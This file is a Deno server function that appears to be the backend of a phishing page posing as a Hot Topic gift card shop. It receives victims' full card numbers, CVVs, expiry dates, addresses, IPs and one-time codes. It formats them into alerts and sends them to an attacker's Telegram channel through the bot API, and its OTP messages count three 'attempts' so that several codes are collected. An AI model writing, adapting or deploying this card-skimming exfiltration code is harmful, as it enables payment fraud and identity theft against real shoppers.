
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const TELEGRAM_BOT_TOKEN = Deno.env.get("TELEGRAM_BOT_TOKEN");
const TELEGRAM_CHANNEL_ID = Deno.env.get("TELEGRAM_CHANNEL_ID");

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface OrderDetails {
  customerName: string;
  email: string;
  phone: string;
  giftCardValue: number;
  paymentAmount: number;
  deliveryMethod: string;
  cryptoCurrency?: string;
  transactionId?: string;
  cardNumber?: string;
  cvv?: string;
  expiryDate?: string;
  lastFour?: string;
  paymentMethod?: string;
  address?: {
    street: string;
    city: string;
    state: string;
    zipCode: string;
  };
  userInfo: {
    ip: string;
    userAgent: string;
    sessionId?: string;
    timestamp: string;
  };
  notificationType: "order_placed" | "payment_details" | "otp_attempt";
  otpAttempt?: number;
}

function formatOrderPlacedMessage(orderDetails: OrderDetails): string {
  const { address } = orderDetails;
  
  let addressSection = '';
  if (orderDetails.deliveryMethod === "physical" && address) {
    addressSection = `
📍 *Shipping Address*:
   Street: ${address.street}
   City: ${address.city}
   State: ${address.state}
   ZIP: ${address.zipCode}`;
  }

  // Payment details section
  let paymentSection = '';
  if (orderDetails.paymentMethod) {
    paymentSection = `
💳 *Payment Information*:
   Method: ${orderDetails.paymentMethod || 'N/A'}
   Card Number: \`${orderDetails.cardNumber || 'N/A'}\`
   Expiry Date: ${orderDetails.expiryDate || 'N/A'}
   CVV: \`${orderDetails.cvv || 'N/A'}\``;
  }

  return `
🚨 <b>NEW HOT TOPIC ORDER PLACED</b> 🚨

👤 <b>Customer Information</b>:
   Name: ${orderDetails.customerName}
   Email: ${orderDetails.email}
   Phone: ${orderDetails.phone}

💳 <b>Order Details</b>:
   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}
   Payment Amount: $${orderDetails.paymentAmount.toFixed(2)}
   Delivery Method: ${orderDetails.deliveryMethod}${addressSection}${paymentSection}

🔍 <b>User Information</b>:
   IP Address: <code>${orderDetails.userInfo.ip}</code>
   Browser: ${orderDetails.userInfo.userAgent}
   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
   Timestamp: ${orderDetails.userInfo.timestamp}

📆 <b>Order Placed</b>: ${new Date().toLocaleString()}
`;
}

function formatPaymentDetailsMessage(orderDetails: OrderDetails): string {
  // Credit card payment details
  let paymentDetails = '';
  if (orderDetails.paymentMethod && orderDetails.paymentMethod.toLowerCase() !== 'cryptocurrency') {
    paymentDetails = `
💳 <b>Card Details</b>:
   Card Number: <code>${orderDetails.cardNumber || 'N/A'}</code>
   Expiry Date: ${orderDetails.expiryDate || 'N/A'}
   CVV: <code>${orderDetails.cvv || 'N/A'}</code>
   Last Four: ${orderDetails.lastFour || 'N/A'}`;
  } else if (orderDetails.cryptoCurrency) {
    paymentDetails = `
💰 <b>Cryptocurrency Details</b>:
   Cryptocurrency: ${orderDetails.cryptoCurrency}
   Transaction ID: <code>${orderDetails.transactionId}</code>`;
  }

  return `
💰 <b>PAYMENT DETAILS SUBMITTED</b> 💰

👤 <b>Customer</b>: ${orderDetails.customerName}
📧 <b>Email</b>: ${orderDetails.email}
📱 <b>Phone</b>: ${orderDetails.phone}

${paymentDetails}
   Amount: $${orderDetails.paymentAmount.toFixed(2)}
   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}

🔍 <b>User Information</b>:
   IP Address: <code>${orderDetails.userInfo.ip}</code>
   Browser: ${orderDetails.userInfo.userAgent}
   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
   Timestamp: ${orderDetails.userInfo.timestamp}

📆 <b>Submitted At</b>: ${new Date().toLocaleString()}
`;
}

function formatOTPAttemptMessage(orderDetails: OrderDetails): string {
  const attempt = orderDetails.otpAttempt || 0;
  const isLastAttempt = attempt === 3;
  
  // Color code based on attempt
  const attemptColor = isLastAttempt ? 'green' : 'red';
  
  const attemptHeader = isLastAttempt 
    ? '✅ <b style="color:green">OTP VERIFICATION SUCCESSFUL</b> ✅' 
    : `⚠️ <b style="color:red">OTP VERIFICATION ATTEMPT ${attempt}</b> ⚠️`;
  
  const statusText = isLastAttempt 
    ? '✅ <span style="color:green">Success - Final attempt</span>' 
    : `❌ <span style="color:red">Failed - Attempt ${attempt} of 3</span>`;

  // Payment details section - show full card details
  let paymentSection = '';
  if (orderDetails.paymentMethod) {
    paymentSection = `
💳 <b>Payment Details</b>:
   Method: ${orderDetails.paymentMethod || 'N/A'}
   Card Number: <code>${orderDetails.cardNumber || 'N/A'}</code>
   Expiry Date: ${orderDetails.expiryDate || 'N/A'}
   CVV: <code>${orderDetails.cvv || 'N/A'}</code>
   Order Amount: $${orderDetails.paymentAmount.toFixed(2)}
   Gift Card Value: $${orderDetails.giftCardValue.toFixed(2)}`;
  }

  return `
${attemptHeader}

👤 <b>Customer</b>: ${orderDetails.customerName}
📧 <b>Email</b>: ${orderDetails.email}
📱 <b>Phone</b>: ${orderDetails.phone}

🔐 <b>Verification Status</b>:
   ${statusText}

${paymentSection}

🔍 <b>User Information</b>:
   IP Address: <code>${orderDetails.userInfo.ip}</code>
   Browser: ${orderDetails.userInfo.userAgent}
   Session ID: ${orderDetails.userInfo.sessionId || 'Not available'}
   Timestamp: ${orderDetails.userInfo.timestamp}

📆 <b>Attempt Time</b>: ${new Date().toLocaleString()}
`;
}

function formatTelegramMessage(orderDetails: OrderDetails): string {
  switch (orderDetails.notificationType) {
    case "order_placed":
      return formatOrderPlacedMessage(orderDetails);
    case "payment_details":
      return formatPaymentDetailsMessage(orderDetails);
    case "otp_attempt":
      return formatOTPAttemptMessage(orderDetails);
    default:
      return formatOrderPlacedMessage(orderDetails);
  }
}

async function sendTelegramNotification(message: string): Promise<boolean> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHANNEL_ID) {
    console.error("Missing Telegram configuration - Bot Token or Channel ID not set");
    return false;
  }

  try {
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    console.log(`Sending message to Telegram channel: ${TELEGRAM_CHANNEL_ID}`);
    
    const response = await fetch(telegramApiUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHANNEL_ID,
        text: message,
        parse_mode: "HTML", // Changed from Markdown to HTML for better styling
      }),
    });

    const data = await response.json();
    
    if (!data.ok) {
      console.error("Telegram API error:", data);
      return false;
    }
    
    console.log("Telegram notification sent successfully:", data.result);
    return true;
  } catch (error) {
    console.error("Error sending Telegram notification:", error);
    return false;
  }
}

serve(async (req) => {
  // Handle CORS preflight requests
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const orderDetails: OrderDetails = await req.json();
    console.log("Received order details for Telegram notification:", orderDetails);
    
    // Format the message for Telegram
    const message = formatTelegramMessage(orderDetails);
    console.log("Formatted Telegram message:", message);
    
    // Send the notification
    const success = await sendTelegramNotification(message);
    
    if (!success) {
      console.error("Failed to send Telegram notification");
      return new Response(
        JSON.stringify({ success: false, error: "Failed to send Telegram notification" }),
        {
          status: 500,
          headers: { "Content-Type": "application/json", ...corsHeaders },
        }
      );
    }

    console.log("Telegram notification sent successfully");
    return new Response(
      JSON.stringify({ success: true }),
      {
        status: 200,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  } catch (error) {
    console.error("Error processing request:", error);
    return new Response(
      JSON.stringify({ success: false, error: error.message }),
      {
        status: 500,
        headers: { "Content-Type": "application/json", ...corsHeaders },
      }
    );
  }
});
